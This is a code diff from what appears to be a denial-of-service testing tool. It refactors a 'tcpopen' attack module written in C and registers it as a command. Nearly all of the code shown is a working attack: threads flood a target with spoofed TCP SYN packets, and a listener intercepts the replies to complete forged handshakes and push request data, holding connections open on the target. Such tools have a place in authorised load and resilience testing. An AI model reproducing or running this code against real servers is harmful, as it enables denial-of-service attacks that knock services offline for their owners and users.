@@ -58,7 +58,7 @@ static void listener_thread(TCPOPEN_WORK *tw)
     FAT("[LL_%02u] Cannot initialize IPQ message.", tw->w->id);
 
   /* listen the radio */
-  while(!config.finalize)
+  while(!cfg->finalize)
   {
     if((status = ipqex_msg_read(&(tw->msg), 0)) <= 0)
     {
@@ -68,8 +68,8 @@ static void listener_thread(TCPOPEN_WORK *tw)
     } else {
       /* but ... in some circumstances ... */
       if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
-      && ipqex_get_ip_header(&(tw->msg))->daddr == config.shost.addr.in.addr
-      && ipqex_get_tcp_header(&(tw->msg))->source == config.dhost.port)
+      && ipqex_get_ip_header(&(tw->msg))->daddr == cfg->shost.addr.in.addr
+      && ipqex_get_tcp_header(&(tw->msg))->source == cfg->dhost.port)
       {
         DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
         /*
@@ -80,10 +80,10 @@ static void listener_thread(TCPOPEN_WORK *tw)
                 (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
                 (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
                 (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
-                ipqex_get_tcp_header(&(tw->msg))->dest, config.dhost.port,
+                ipqex_get_tcp_header(&(tw->msg))->dest, cfg->dhost.port,
                 ipqex_get_tcp_header(&(tw->msg))->rst,
                 ipqex_get_ip_header(&(tw->msg))->saddr,
-                config.shost.s_addr);
+                cfg->shost.s_addr);
         */
 
         /* ignore any packet that have anything to do with this connection */
@@ -97,21 +97,21 @@ static void listener_thread(TCPOPEN_WORK *tw)
           /* send handshake and data TCP packet */
           DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
           ln_send_packet(&(tw->lnc),
-                         &config.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                         &config.dhost.addr.in.inaddr, config.dhost.port,
+                         &cfg->shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                         &cfg->dhost.addr.in.inaddr, cfg->dhost.port,
                          TH_ACK,
                          ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
                          ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
                          ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
                          NULL, 0);
           ln_send_packet(&(tw->lnc),
-                         &config.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                         &config.dhost.addr.in.inaddr, config.dhost.port,
+                         &cfg->shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                         &cfg->dhost.addr.in.inaddr, cfg->dhost.port,
                          TH_ACK | TH_PUSH,
                          ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
                          ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
                          ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                         (char *) config.req, config.req_size);
+                         (char *) cfg->req, cfg->req_size);
         }
       } else
         /* policy: accept anything unknown */
@@ -135,12 +135,12 @@ static void sender_thread(TCPOPEN_WORK *tw)
   DBG("[SS_%02u] Started sender thread", tw->w->id);
 
   /* set how many packets will be sent by this thread */
-  npackets = config.packets / (config.c - config.l);
-  if(tw->w->id == config.c - 1)
-    npackets += config.packets - (npackets * (config.c - config.l));
+  npackets = cfg->packets / (cfg->c - cfg->l);
+  if(tw->w->id == cfg->c - 1)
+    npackets += cfg->packets - (npackets * (cfg->c - cfg->l));
 
   /* ATTACK */
-  while(!config.finalize)
+  while(!cfg->finalize)
   {
     /* wait for work */
     pthreadex_flag_wait(&attack_flag);
@@ -151,8 +151,8 @@ static void sender_thread(TCPOPEN_WORK *tw)
     {
       seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
       ln_send_packet(&tw->lnc,
-                     &config.shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
-                     &config.dhost.addr.in.inaddr, config.dhost.port,
+                     &cfg->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
+                     &cfg->dhost.addr.in.inaddr, cfg->dhost.port,
                      TH_SYN, 13337,
                      seq, 0,
                      NULL, 0);
@@ -173,7 +173,7 @@ static void attack_tcpopen__thread_cleanup(TCPOPEN_WORK *tw)
   ln_destroy_context(&(tw->lnc));
 
   /* close ipq (if this is a listener thread) */
-  if(tw->w->id < config.l)
+  if(tw->w->id < cfg->l)
   {
     DBG("[MM_%02u] Freeing IPQ message...", tw->w->id);
     ipqex_msg_destroy(&(tw->msg));
@@ -204,7 +204,7 @@ static void attack_tcpopen__thread(THREAD_WORK *w)
   pthreadex_barrier_wait(w->start);
 
   /* launch specialized thread */
-  if(w->id < config.l)
+  if(w->id < cfg->l)
     listener_thread(&tw);
   else
     sender_thread(&tw);
@@ -223,7 +223,7 @@ static int attack_tcpopen__go2work(void)
   return pthreadex_flag_up(&attack_flag);
 }
 
-void attack_tcpopen(void)
+static void attack_tcpopen(void)
 {
   /* initialize */
   DBG("Initializing IPQ...");
@@ -240,4 +240,20 @@ void attack_tcpopen(void)
   ipqex_destroy(&attack_tcpopen__ipq);
 }
 
+
+/*****************************************************************************
+ * COMMAND DECLARATION
+ *
+ *   Following structure defines command name, syntax, operations and default
+ *   tests mask.
+ *
+ *****************************************************************************/
+
+static char *command_aliases[] = { "tcpopen", "topen", NULL };
+
+DOS_COMMAND dos_attack_tcpopen = {
+  /* command names:                  */ command_aliases,
+  /* command implementation:         */ attack_tcpopen,
+  /* minimum and maximum parameters: */ 0, 0
+};
 
